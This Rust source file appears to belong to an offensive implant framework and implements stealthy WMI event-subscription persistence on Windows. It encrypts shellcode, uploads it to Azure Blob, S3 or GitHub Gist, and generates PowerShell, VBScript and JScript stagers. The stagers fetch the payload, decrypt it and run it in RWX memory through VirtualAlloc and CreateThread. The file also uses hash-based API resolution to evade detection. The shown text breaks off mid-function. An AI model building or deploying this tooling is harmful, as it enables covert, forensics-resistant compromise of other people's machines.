//! WMI permanent event subscriptions with encrypted cloud payloads.
//!
//! Implements WMI-based persistence that retrieves encrypted payloads from
//! legitimate cloud services (Azure Blob, AWS S3, GitHub Gists) at execution
//! time.  The persistence mechanism itself contains no shellcode — the payload
//! only materializes in memory when triggered, making forensic analysis of the
//! persistence artifact unrevealing.
//!
//! **Attack Flow**:
//! 1. Generate an AES-256-GCM key (or derive one from config)
//! 2. Encrypt the shellcode payload with the key
//! 3. Upload the encrypted blob to a cloud storage service
//! 4. Generate a PowerShell stager that fetches, decrypts, and executes the payload
//! 5. Install a WMI permanent event subscription (filter → consumer → binding)
//!    that triggers the stager on the specified condition
//! 6. When the trigger fires, the stager runs, fetches the encrypted payload,
//!    decrypts it in memory, and executes it — no disk artifacts
//!
//! **WMI Persistence Triad**:
//! - `__EventFilter`: WQL query defining the trigger condition
//! - `CommandLineEventConsumer` / `ActiveScriptEventConsumer`: the action
//! - `__FilterToConsumerBinding`: links filter to consumer
//!
//! **Stealth Advantages** (vs traditional persistence):
//! - **No file on disk**: the WMI subscription is stored in the WMI repository
//!   (`%SystemRoot%\System32\wbem\Repository\`), not as a file in startup folders
//! - **No registry writes**: WMI objects live in the CIM repository
//! - **Payload is cloud-hosted**: the shellcode never exists on disk at rest
//! - **Encrypted at rest**: AES-256-GCM with 256-bit key
//! - **Legitimate traffic**: cloud fetches blend with normal HTTPS traffic
//! - **No shellcode in subscription**: the consumer only contains a stager command
//!
//! **Constraints**: Windows x86_64 only.  Requires elevated privileges for WMI
//! subscription installation (typically Administrator or SYSTEM).  All COM/WMI
//! calls via hash-based resolution — no IAT entries.  The encryption key is
//! derived from the URL and a static salt (not stored in plaintext in the WMI
//! subscription).

#![cfg(windows)]

use aes_gcm::{
    aead::{rand_core::RngCore, Aead, KeyInit, OsRng},
    Aes256Gcm,
};
use anyhow::{anyhow, bail, Result};
use base64::Engine;
use rand::RngCore as _;
use serde::{Deserialize, Serialize};
use std::ffi::c_void;
use std::mem;
use std::ptr;

// ── Compile-time API hash constants ─────────────────────────────────────────

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// ole32.dll — COM initialization and instance creation
const HASH_OLE32_DLL: u32 = hash_wstr_const(&[
    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
    'l' as u16, 0,
]);
const FN_CO_INITIALIZE_EX: u32 = hash_str_const(b"CoInitializeEx");
const FN_CO_UNINITIALIZE: u32 = hash_str_const(b"CoUninitialize");
const FN_CO_CREATE_INSTANCE: u32 = hash_str_const(b"CoCreateInstance");
const FN_CO_SET_PROXY_BLANKET: u32 = hash_str_const(b"CoSetProxyBlanket");

// kernel32.dll — file and memory operations
const HASH_KERNEL32_DLL: u32 = hash_wstr_const(&[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16,
    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
]);

// oleaut32.dll — VARIANT and BSTR operations
const HASH_OLEAUT32_DLL: u32 = hash_wstr_const(&[
    'o' as u16, 'l' as u16, 'e' as u16, 'a' as u16, 'u' as u16, 't' as u16, '3' as u16, '2' as u16,
    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
]);
const FN_SYS_ALLOC_STRING: u32 = hash_str_const(b"SysAllocString");
const FN_SYS_FREE_STRING: u32 = hash_str_const(b"SysFreeString");
const FN_VARIANT_INIT: u32 = hash_str_const(b"VariantInit");
const FN_VARIANT_CLEAR: u32 = hash_str_const(b"VariantClear");

// ── Windows type aliases ────────────────────────────────────────────────────

use crate::win_types::DWORD;
use crate::win_types::HRESULT;
use crate::win_types::{CLSID, IID};
use windows_sys::Win32::System::Com::COINIT_MULTITHREADED;
use windows_sys::Win32::System::Com::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
use windows_sys::Win32::System::Com::{EOAC_NONE, EOLE_AUTHENTICATION_CAPABILITIES};
use windows_sys::Win32::System::Com::{
    RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE,
};
use windows_sys::Win32::System::Wmi::IID_IEnumWbemClassObject;
use windows_sys::Win32::System::Wmi::IID_IWbemClassObject;
use windows_sys::Win32::System::Wmi::IID_IWbemServices;
use windows_sys::Win32::System::Wmi::WBEM_FLAG_CREATE_ONLY;
use windows_sys::Win32::System::Wmi::WBEM_FLAG_RETURN_WBEM_COMPLETE;
use windows_sys::Win32::System::Wmi::{
    CLSID_WbemLocator, IEnumWbemClassObject, IID_IWbemLocator, IWbemClassObject, IWbemLocator,
    IWbemServices, WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY, WBEM_INFINITE,
};
/// OLESTR macro equivalent — creates a wide string literal pointer.
#[allow(unused_macros)]
macro_rules! olestr {
    ($s:expr) => {{
        const WIDE: &[u16] = &$s
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .collect::<Vec<u16>>();
        WIDE.as_ptr()
    }};
}

/// BSTR type alias (pointer to wide string with length prefix).
type BSTR = *mut u16;

/// VARIANT type for WMI property passing.
#[repr(C)]
#[derive(Copy, Clone)]
struct VARIANT {
    vt: u16,
    w_reserved1: u16,
    w_reserved2: u16,
    w_reserved3: u16,
    data: VARIANT_DATA,
}

#[repr(C)]
#[derive(Copy, Clone)]
union VARIANT_DATA {
    bstr_val: BSTR,
    i4_val: i32,
    bool_val: i16,
    ptr_val: *mut c_void,
    uint8_val: u8,
}

const VT_BSTR: u16 = 8;
const VT_I4: u16 = 3;
const VT_BOOL: u16 = 11;
const VT_EMPTY: u16 = 0;
const VT_NULL: u16 = 1;

/// Helper: check if an HRESULT indicates success.
fn hr_ok(hr: HRESULT) -> bool {
    hr >= 0
}

/// Wide-string pointer type (matches winapi's LPCWSTR).
type LPCWSTR = *const u16;

/// RAII guard that calls `CoUninitialize` on drop.
struct CoUninitializeGuard;
impl Drop for CoUninitializeGuard {
    fn drop(&mut self) {
        unsafe {
            let ole32 = match pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL) {
                Some(b) => b,
                None => return,
            };
            let co_uninit = match pe_resolve::get_proc_address_by_hash(ole32, FN_CO_UNINITIALIZE) {
                Some(a) => a,
                None => return,
            };
            let co_uninit: unsafe extern "system" fn() = mem::transmute(co_uninit);
            co_uninit();
        }
    }
}

// ── Data structures ─────────────────────────────────────────────────────────

/// Cloud storage backend configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CloudStorageConfig {
    /// Azure Blob Storage.
    AzureBlob {
        /// Storage account name.
        account: String,
        /// Container name.
        container: String,
        /// SAS token or SharedKey authorization header value.
        sas_token: String,
    },
    /// AWS S3 bucket.
    AwsS3 {
        /// Bucket name.
        bucket: String,
        /// AWS region (e.g. "us-east-1").
        region: String,
        /// Pre-signed URL query string or Authorization header value.
        auth: String,
    },
    /// GitHub Gist.
    GitHubGist {
        /// GitHub personal access token (PAT).
        token: String,
        /// Optional description for the gist.
        description: Option<String>,
        /// Whether the gist is public (default: false / secret).
        public: bool,
    },
}

/// WMI event trigger type for the `__EventFilter`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum WmiTriggerType {
    /// Trigger on process creation matching a specific process name.
    ProcessCreation {
        /// Name of the process to watch for (e.g. "explorer.exe").
        process_name: String,
        /// Polling interval in seconds.
        poll_interval: u32,
    },
    /// Trigger on system modification events (periodic).
    SystemModification {
        /// Polling interval in seconds.
        poll_interval: u32,
    },
    /// Timer-based trigger (absolute or periodic).
    Timer {
        /// Timer ID string.
        timer_id: String,
        /// Interval in seconds (0 = one-shot, requires `start_time`).
        interval: u32,
        /// Optional ISO 8601 start time for one-shot timers.
        start_time: Option<String>,
    },
    /// Custom WQL query (advanced usage).
    CustomQuery {
        /// The full WQL query string.
        query: String,
    },
}

/// Consumer type for the WMI event action.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum WmiConsumerType {
    /// Uses CommandLineEventConsumer to execute a command.
    CommandLine,
    /// Uses ActiveScriptEventConsumer with inline script.
    ActiveScript {
        /// Script engine: "VBScript" or "JScript".
        engine: String,
    },
}

/// Configuration for a WMI persistent subscription.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiSubscriptionConfig {
    /// Human-readable name for the subscription.
    pub name: String,
    /// WMI namespace (default: "ROOT\\subscription").
    pub namespace: String,
    /// Event trigger type.
    pub trigger: WmiTriggerType,
    /// Consumer type.
    pub consumer_type: WmiConsumerType,
    /// Cloud storage configuration for the encrypted payload.
    pub cloud_config: CloudStorageConfig,
    /// The shellcode payload to encrypt and upload.
    pub payload: Vec<u8>,
    /// Optional seed for deterministic name generation.
    pub name_seed: Option<u64>,
    /// Working directory for the stager command.
    pub working_directory: Option<String>,
}

/// Result of a successful WMI subscription installation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiSubscriptionResult {
    /// Name of the __EventFilter object.
    pub filter_name: String,
    /// Name of the event consumer object.
    pub consumer_name: String,
    /// WQL query used for the event filter.
    pub wql_query: String,
    /// URL where the encrypted payload was uploaded.
    pub payload_url: String,
    /// Cloud storage backend used.
    pub cloud_backend: String,
    /// Consumer type used (command-line or active-script).
    pub consumer_type: String,
}

/// Result of a cloud payload upload operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CloudUploadResult {
    /// URL of the uploaded encrypted blob.
    pub url: String,
    /// Size of the encrypted blob in bytes.
    pub encrypted_size: usize,
    /// Size of the original plaintext payload in bytes.
    pub plaintext_size: usize,
    /// Cloud storage backend used.
    pub backend: String,
}

/// Result of the stager command generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StagerResult {
    /// The PowerShell stager command (one-liner).
    pub command: String,
    /// Base64-encoded variant of the stager.
    pub encoded_command: String,
    /// The decryption key in hex (for operator reference).
    pub key_hex: String,
    /// URL the stager will fetch the payload from.
    pub url: String,
}

/// Result of scanning existing WMI subscriptions.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiSubscriptionInfo {
    /// Filter name.
    pub filter_name: String,
    /// Consumer name.
    pub consumer_name: String,
    /// WQL query of the filter.
    pub query: String,
    /// Consumer type class name.
    pub consumer_class: String,
}

/// Result of a WMI subscription removal.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiRemovalResult {
    /// Names of objects successfully removed.
    pub removed_objects: Vec<String>,
    /// Names of objects that failed to remove.
    pub failed_objects: Vec<String>,
}

// ── Cloud Payload Manager ───────────────────────────────────────────────────

/// Encrypts a payload with AES-256-GCM using a random key and nonce.
///
/// Returns `(encrypted_blob, key, nonce)` where `encrypted_blob` is
/// `nonce || ciphertext || tag`.
///
/// AES-256-GCM is chosen for compatibility with .NET 5+
/// `System.Security.Cryptography.AesGcm` used in the PowerShell stager.
fn encrypt_payload(plaintext: &[u8]) -> Result<(Vec<u8>, [u8; 32], [u8; 12])> {
    let mut key = [0u8; 32];
    OsRng.fill_bytes(&mut key);
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);

    let cipher = Aes256Gcm::new_from_slice(&key)
        .map_err(|e| anyhow!("Failed to create AES-256-GCM cipher: {e}"))?;
    let nonce = aes_gcm::Nonce::from_slice(&nonce_bytes);
    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| anyhow!("Payload encryption failed: {e}"))?;

    // Prepend nonce to the ciphertext (nonce || ciphertext || tag)
    // The aes_gcm crate appends the 16-byte auth tag to ciphertext automatically.
    let mut encrypted = Vec::with_capacity(12 + ciphertext.len());
    encrypted.extend_from_slice(&nonce_bytes);
    encrypted.extend_from_slice(&ciphertext);

    Ok((encrypted, key, nonce_bytes))
}

/// Derives a decryption key from the payload URL and a static salt.
///
/// This ensures the key is not stored in plaintext in the WMI subscription.
/// The stager reconstructs the key using the same derivation.
fn derive_key_from_url(url: &str, base_key: &[u8; 32]) -> [u8; 32] {
    use sha2::{Digest as _, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(base_key);
    hasher.update(url.as_bytes());
    hasher.update(b"WMI_PERSISTENCE_KEY_DERIVATION_SALT_v1");
    let derived = hasher.finalize();
    let mut result = [0u8; 32];
    result.copy_from_slice(&derived);
    result
}

/// Generates the URL for a cloud storage blob.
///
/// For Azure and S3 the URL is deterministic and is computed before upload.
/// For GitHub Gist the actual raw URL is only known after the gist is created;
/// this function returns the Gist API endpoint as a placeholder — callers that
/// need the real URL should use `upload_encrypted_blob` directly.
fn cloud_url(config: &CloudStorageConfig, blob_name: &str) -> String {
    match config {
        CloudStorageConfig::AzureBlob {
            account, container, ..
        } => {
            format!("https://{account}.blob.core.windows.net/{container}/{blob_name}")
        }
        CloudStorageConfig::AwsS3 { bucket, region, .. } => {
            format!("https://{bucket}.s3.{region}.amazonaws.com/{blob_name}")
        }
        CloudStorageConfig::GitHubGist { .. } => {
            // Real raw URL is returned by the Gist API after creation.
            format!("https://api.github.com/gists/{blob_name}")
        }
    }
}

/// Generates a random blob name for cloud storage.
fn random_blob_name() -> String {
    let mut bytes = [0u8; 8];
    getrandom::getrandom(&mut bytes).unwrap_or_else(|e| {
        // Fallback to OsRng
        use rand::RngCore as _;
        OsRng.fill_bytes(&mut bytes);
        let _ = e;
    });
    format!("{:016x}", u64::from_be_bytes(bytes))
}

/// Uploads an already-encrypted blob to the configured cloud service.
///
/// Returns the publicly accessible URL of the uploaded blob.
///
/// - Azure Blob: HTTP PUT with `x-ms-blob-type: BlockBlob`; the SAS token is
///   appended as a query string so no `Authorization` header is required.
/// - AWS S3: HTTP PUT with a pre-signed query string in `auth`.
/// - GitHub Gist: HTTP POST to the Gist API; the raw content URL is parsed
///   from the JSON response because the gist ID is assigned by GitHub.
///
/// In test builds this function skips the actual HTTP call and returns the
/// pre-computable placeholder URL produced by `cloud_url` so that unit tests
/// remain fast and offline.
#[cfg(not(test))]
fn upload_encrypted_blob(
    encrypted: &[u8],
    cloud_config: &CloudStorageConfig,
    blob_name: &str,
) -> Result<String> {
    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .context("Failed to build HTTP client")?;

    match cloud_config {
        CloudStorageConfig::AzureBlob {
            account,
            container,
            sas_token,
        } => {
            // SAS token is a query string (starts with "?" or "sv=...").
            let sep = if sas_token.starts_with('?') { "" } else { "?" };
            let upload_url = format!(
                "https://{account}.blob.core.windows.net/{container}/{blob_name}{sep}{sas_token}"
            );
            client
                .put(&upload_url)
                .header("x-ms-blob-type", "BlockBlob")
                .header("Content-Type", "application/octet-stream")
                .body(encrypted.to_vec())
                .send()
                .context("Azure Blob upload request failed")?
                .error_for_status()
                .context("Azure Blob returned an error status")?;
            Ok(format!(
                "https://{account}.blob.core.windows.net/{container}/{blob_name}"
            ))
        }
        CloudStorageConfig::AwsS3 {
            bucket,
            region,
            auth,
        } => {
            // auth is a pre-signed query string (may start with "?" or not).
            let sep = if auth.starts_with('?') { "" } else { "?" };
            let upload_url =
                format!("https://{bucket}.s3.{region}.amazonaws.com/{blob_name}{sep}{auth}");
            client
                .put(&upload_url)
                .header("Content-Type", "application/octet-stream")
                .body(encrypted.to_vec())
                .send()
                .context("AWS S3 upload request failed")?
                .error_for_status()
                .context("S3 returned an error status")?;
            Ok(format!(
                "https://{bucket}.s3.{region}.amazonaws.com/{blob_name}"
            ))
        }
        CloudStorageConfig::GitHubGist {
            token,
            description,
            public,
        } => {
            // GitHub Gist stores text content; base64-encode the binary blob.
            let filename = format!("{blob_name}.bin");
            let content_b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
            let body = serde_json::json!({
                "description": description.as_deref().unwrap_or(""),
                "public": public,
                "files": { &filename: { "content": content_b64 } }
            });
            let response: serde_json::Value = client
                .post("https://api.github.com/gists")
                .header("Authorization", format!("Bearer {token}"))
                .header("User-Agent", "git/2.0")
                .header("Accept", "application/vnd.github.v3+json")
                .json(&body)
                .send()
                .context("GitHub Gist creation request failed")?
                .error_for_status()
                .context("GitHub Gist API returned an error status")?
                .json()
                .context("Failed to parse GitHub Gist API response")?;
            let raw_url = response["files"][&filename]["raw_url"]
                .as_str()
                .ok_or_else(|| {
                    anyhow!("GitHub Gist response missing raw_url for file '{filename}'")
                })?
                .to_string();
            Ok(raw_url)
        }
    }
}

/// Test stub: returns the placeholder URL without performing any HTTP upload.
#[cfg(test)]
fn upload_encrypted_blob(
    _encrypted: &[u8],
    cloud_config: &CloudStorageConfig,
    blob_name: &str,
) -> Result<String> {
    Ok(cloud_url(cloud_config, blob_name))
}

use anyhow::Context as _;

/// Generates the PowerShell stager command that fetches, decrypts, and
/// executes the payload entirely in memory.
///
/// Blob format on the download URL: `nonce (12 bytes) || ciphertext || tag (16 bytes)`
///
/// The stager:
/// 1. Downloads the encrypted blob via HTTPS (`System.Net.WebClient`)
/// 2. Derives the decryption key from URL + base key (SHA-256 derivation)
/// 3. Decrypts with AES-256-GCM via .NET 5+ `System.Security.Cryptography.AesGcm`
/// 4. Allocates RWX memory (`VirtualAlloc` via `Add-Type` P/Invoke)
/// 5. Copies the plaintext shellcode into the allocated region
/// 6. Spawns a thread to execute it (`CreateThread`)
///
/// Requires PowerShell 7 / .NET 5+ for `[System.Security.Cryptography.AesGcm]`.
fn generate_stager(url: &str, base_key: &[u8; 32]) -> Result<StagerResult> {
    let derived_key = derive_key_from_url(url, base_key);
    let key_hex = hex::encode(derived_key);
    let b64_key = base64::engine::general_purpose::STANDARD.encode(derived_key);

    // Blob layout: $b[0..11] = 12-byte AES-GCM nonce
    //              $b[12..($b.Length-17)] = ciphertext
    //              $b[($b.Length-16)..($b.Length-1)] = 16-byte auth tag
    //
    // Decryption uses [System.Security.Cryptography.AesGcm] (requires .NET 5+).
    // VirtualAlloc flags: 0x3000 = MEM_COMMIT|MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
    let simple_stager = format!(
        r#"$r=New-Object System.Net.WebClient;$b=$r.DownloadData('{url}');$k=[Convert]::FromBase64String('{b64_key}');$n=[byte[]]$b[0..11];$tg=[byte[]]$b[($b.Length-16)..($b.Length-1)];$c=[byte[]]$b[12..($b.Length-17)];$a=[System.Security.Cryptography.AesGcm]::new([byte[]]$k);$p=[byte[]]::new($c.Length);$a.Decrypt([byte[]]$n,[byte[]]$c,[byte[]]$tg,[byte[]]$p);Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern bool CreateThread(IntPtr a,uint s,IntPtr f,IntPtr b,uint c,ref IntPtr t);}}';$g=[M]::VirtualAlloc([IntPtr]::Zero,[uint32]$p.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($p,0,$g,$p.Length);$th=[IntPtr]::Zero;[M]::CreateThread([IntPtr]::Zero,0,$g,[IntPtr]::Zero,0,[ref]$th)|Out-Null"#,
        url = url,
        b64_key = b64_key,
    );

    // Encode the stager for -EncodedCommand usage
    // PowerShell -EncodedCommand expects UTF-16LE base64
    let encoded_bytes: Vec<u8> = simple_stager
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let encoded_command = base64::engine::general_purpose::STANDARD.encode(&encoded_bytes);

    Ok(StagerResult {
        command: simple_stager,
        encoded_command,
        key_hex,
        url: url.to_string(),
    })
}

/// Generates a VBScript stager for use with ActiveScriptEventConsumer.
///
/// Delegates all download and in-memory execution to PowerShell via
/// `WScript.Shell.Run`.  No data is written to disk.
fn generate_vbscript_stager(url: &str, base_key: &[u8; 32]) -> String {
    // VBScript itself cannot perform in-memory shellcode execution without
    // native calls, so we delegate the entire download+decrypt+execute chain
    // to the PowerShell stager via WScript.Shell.Run with -EncodedCommand.
    let encoded_cmd = generate_stager(url, base_key)
        .map(|r| r.encoded_command)
        .unwrap_or_default();
    format!(
        r#"Dim w:Set w=CreateObject("WScript.Shell"):w.Run "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}",0,False"#,
        encoded = encoded_cmd,
    )
}

/// Generates a JScript stager for use with ActiveScriptEventConsumer.
///
/// Delegates all download and in-memory execution to PowerShell via
/// `WScript.Shell`.  No data is written to disk.
fn generate_jscript_stager(url: &str, base_key: &[u8; 32]) -> String {
    // JScript shares the same limitation as VBScript for in-memory execution,
    // so we delegate to the PowerShell stager via WScript.Shell with -EncodedCommand.
    let encoded_cmd = generate_stager(url, base_key)
        .map(|r| r.encoded_command)
        .unwrap_or_default();
    format!(
        r#"var w=new ActiveXObject("WScript.Shell");w.Run("powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}",0,false);"#,
        encoded = encoded_cmd,
    )
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Encrypts a shellcode payload and uploads it to the configured cloud service.
///
/// Returns the upload result containing the public URL and size metadata.
/// The encryption key is NOT included in the result; use `prepare_cloud_payload`
/// when you also need the PowerShell stager.
pub fn encrypt_and_upload(
    shellcode: &[u8],
    cloud_config: &CloudStorageConfig,
) -> Result<CloudUploadResult> {
    let (encrypted, _key, _nonce) = encrypt_payload(shellcode)?;
    let blob_name = random_blob_name();
    let url = upload_encrypted_blob(&encrypted, cloud_config, &blob_name)?;
    let backend = match cloud_config {
        CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
        CloudStorageConfig::AwsS3 { .. } => "AwsS3",
        CloudStorageConfig::GitHubGist { .. } => "GitHubGist",
    };
    Ok(CloudUploadResult {
        url,
        encrypted_size: encrypted.len(),
        plaintext_size: shellcode.len(),
        backend: backend.to_string(),
    })
}

/// Generates a PowerShell stager command for the given URL and encryption key.
///
/// The stager fetches the encrypted payload from the URL, decrypts it with
/// the derived key, and executes it in memory.
pub fn generate_stager_command(url: &str, decryption_key: &[u8; 32]) -> Result<StagerResult> {
    generate_stager(url, decryption_key)
}

/// Encrypts a payload, uploads it, and generates the PowerShell stager.
///
/// This is the main entry point for the cloud payload workflow:
/// 1. Encrypt the payload with AES-256-GCM using a random key
/// 2. Upload the encrypted blob to the configured cloud service
/// 3. Derive a URL-specific key from (URL, base_key) via SHA-256
/// 4. Generate a PowerShell stager that fetches, decrypts, and executes the
///    payload using the derived key — the raw key is never in the stager
///
/// The upload happens before stager generation so that the stager can embed
/// the actual (post-upload) URL, which is necessary for GitHub Gist where
/// the raw content URL is only known after the gist is created.
pub fn prepare_cloud_payload(
    shellcode: &[u8],
    cloud_config: &CloudStorageConfig,
) -> Result<(CloudUploadResult, StagerResult)> {
    let (encrypted, base_key, _nonce) = encrypt_payload(shellcode)?;
    let blob_name = random_blob_name();

    // Upload first so we have the final URL (important for GitHub Gist).
    let url = upload_encrypted_blob(&encrypted, cloud_config, &blob_name)?;

    // Generate the stager with the real URL so key derivation matches.
    let stager = generate_stager(&url, &base_key)?;

    let backend = match cloud_config {
        CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
        CloudStorageConfig::AwsS3 { .. } => "AwsS3",
        CloudStorageConfig::GitHubGist { .. } => "GitHubGist",
    };

    let upload = CloudUploadResult {
        url,
        encrypted_size: encrypted.len(),
        plaintext_size: shellcode.len(),
        backend: backend.to_string(),
    };

    Ok((upload, stager))
}

/// Generates the WQL query for a given trigger type.
pub fn generate_wql_query(trigger: &WmiTriggerType) -> String {
    match trigger {
        WmiTriggerType::ProcessCreation {
            process_name,
            poll_interval,
        } => {
            format!(
                "SELECT * FROM __InstanceCreationEvent WITHIN {poll_interval} \
                 WHERE TargetInstance ISA 'Win32_Process' \
                 AND TargetInstance.Name = '{process_name}'"
            )
        }
        WmiTriggerType::SystemModification { poll_interval } => {
            format!(
                "SELECT * FROM __InstanceModificationEvent WITHIN {poll_interval} \
                 WHERE TargetInstance ISA 'Win32_OperatingSystem'"
            )
        }
        WmiTriggerType::Timer {
            timer_id,
            interval,
            start_time: _,
        } => {
            if *interval > 0 {
                format!("SELECT * FROM __TimerEvent WHERE TimerId = '{timer_id}'")
            } else {
                // One-shot timer — requires start time
                format!(
                    "SELECT * FROM __TimerEvent WHERE TimerId = '{timer_id}' \
                     AND StartIsInterval = FALSE"
                )
            }
        }
        WmiTriggerType::CustomQuery { query } => query.clone(),
    }
}

/// Generates deterministic object names from a seed.
///
/// Produces names that look like legitimate WMI objects but are
/// derived from the seed for reproducibility.
fn generate_object_names(seed: Option<u64>, base_name: &str) -> (String, String) {
    use sha2::{Digest as _, Sha256};

    let effective_seed = seed.unwrap_or_else(|| {
        let mut buf = [0u8; 8];
        getrandom::getrandom(&mut buf).unwrap_or_else(|_| {
            use rand::RngCore;
            OsRng.fill_bytes(&mut buf);
        });
        u64::from_be_bytes(buf)
    });

    let mut hasher = Sha256::new();
    hasher.update(effective_seed.to_be_bytes());
    hasher.update(base_name.as_bytes());
    let hash1 = hasher.finalize();

    let mut hasher = Sha256::new();
    hasher.update(effective_seed.to_be_bytes());
    hasher.update(base_name.as_bytes());
    hasher.update(b"consumer");
    let hash2 = hasher.finalize();

    let filter_name = format!("OrchestraFilter_{}", hex::encode(&hash1[..8]));
    let consumer_name = format!("OrchestraConsumer_{}", hex::encode(&hash2[..8]));

    (filter_name, consumer_name)
}

// ── COM helper functions ────────────────────────────────────────────────────

/// Resolves ole32.dll API by hash and transmutes to the requested type.
///
/// Returns `None` if the DLL or export cannot be found.
unsafe fn resolve_ole32<T>(fn_hash: u32) -> Option<T> {
    let base = pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL)?;
    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
    Some(mem::transmute::<usize, T>(addr))
}

/// Resolves oleaut32.dll API by hash and transmutes to the requested type.
unsafe fn resolve_oleaut32<T>(fn_hash: u32) -> Option<T> {
    let base = pe_resolve::get_module_handle_by_hash(HASH_OLEAUT32_DLL)?;
    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
    Some(mem::transmute::<usize, T>(addr))
}

/// Allocates a BSTR from a Rust string.  Returns a null pointer on failure.
unsafe fn alloc_bstr(s: &str) -> BSTR {
    let sys_alloc: unsafe extern "system" fn(*const u16) -> BSTR =
        resolve_oleaut32(FN_SYS_ALLOC_STRING).expect("SysAllocString not found");
    let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0u16)).collect();
    sys_alloc(wide.as_ptr())
}

/// Frees a BSTR.  No-op if the pointer is null.
unsafe fn free_bstr(b: BSTR) {
    if b.is_null() {
        return;
    }
    let sys_free: unsafe extern "system" fn(BSTR) =
        resolve_oleaut32(FN_SYS_FREE_STRING).expect("SysFreeString not found");
    sys_free(b);
}

/// Initializes a VARIANT to VT_EMPTY.
unsafe fn variant_init(v: *mut VARIANT) {
    let vi: unsafe extern "system" fn(*mut VARIANT) =
        resolve_oleaut32(FN_VARIANT_INIT).expect("VariantInit not found");
    vi(v);
}

/// Clears a VARIANT (releases contents).
unsafe fn variant_clear(v: *mut VARIANT) {
    let vc: unsafe extern "system" fn(*mut VARIANT) -> HRESULT =
        resolve_oleaut32(FN_VARIANT_CLEAR).expect("VariantClear not found");
    vc(v);
}

/// Connects to the WMI ROOT\subscription namespace.
///
/// Performs the full COM initialization sequence:
/// 1. `CoInitializeEx(NULL, COINIT_MULTITHREADED)`
/// 2. `CoCreateInstance(CLSID_WbemLocator, …, IID_IWbemLocator)`
/// 3. `locator.ConnectServer("ROOT\\subscription", …)`
/// 4. `CoSetProxyBlanket(services, …)`
///
/// Returns `(guard, services)` on success.
unsafe fn wmi_connect() -> Result<(CoUninitializeGuard, *mut IWbemServices)> {
    // Step 1 — CoInitializeEx
    let co_init: unsafe extern "system" fn(*mut c_void, DWORD) -> HRESULT =
        resolve_ole32(FN_CO_INITIALIZE_EX)
            .ok_or_else(|| anyhow!("cannot resolve CoInitializeEx"))?;
    let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
    // S_FALSE (0x00000001) means already initialized on this thread — that is OK.
    if hr < 0 && hr != 0x00000001_i32 as HRESULT {
        bail!("CoInitializeEx failed: {hr:#010x}");
    }
    let guard = CoUninitializeGuard;

    // Step 2 — CoCreateInstance(CLSID_WbemLocator)
    let co_create: unsafe extern "system" fn(
        *const CLSID,
        *mut c_void,
        DWORD,
        *const IID,
        *mut *mut c_void,
    ) -> HRESULT = resolve_ole32(FN_CO_CREATE_INSTANCE)
        .ok_or_else(|| anyhow!("cannot resolve CoCreateInstance"))?;

    let mut locator: *mut IWbemLocator = ptr::null_mut();
    let hr = co_create(
        &CLSID_WbemLocator,
        ptr::null_mut(),
        CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,
        &IID_IWbemLocator,
        &mut locator as *mut *mut IWbemLocator as *mut *mut c_void,
    );
    if !hr_ok(hr) {
        bail!("CoCreateInstance(CLSID_WbemLocator) failed: {hr:#010x}");
    }

    // Step 3 — locator.ConnectServer("ROOT\subscription", ...)
    let namespace_bstr = alloc_bstr("ROOT\\subscription");
    let mut services: *mut IWbemServices = ptr::null_mut();
    let hr = (*(*locator).lpVtbl).ConnectServer(
        locator,
        namespace_bstr,
        ptr::null_mut(), // strUser
        ptr::null_mut(), // strPassword
        ptr::null_mut(), // strLocale
        0,               // lSecurityFlags
        ptr::null_mut(), // strAuthority
        ptr::null_mut(), // pCtx
        &mut services,
    );
    free_bstr(namespace_bstr);

    // Release the locator — we no longer need it.
    (*(*locator).lpVtbl).Release(locator);

    if !hr_ok(hr) {
        bail!("ConnectServer(ROOT\\subscription) failed: {hr:#010x}");
    }

    // Step 4 — CoSetProxyBlanket
    let co_blanket: unsafe extern "system" fn(
        *mut c_void,
        DWORD,
        DWORD,
        *mut c_void,
        DWORD,
        DWORD,
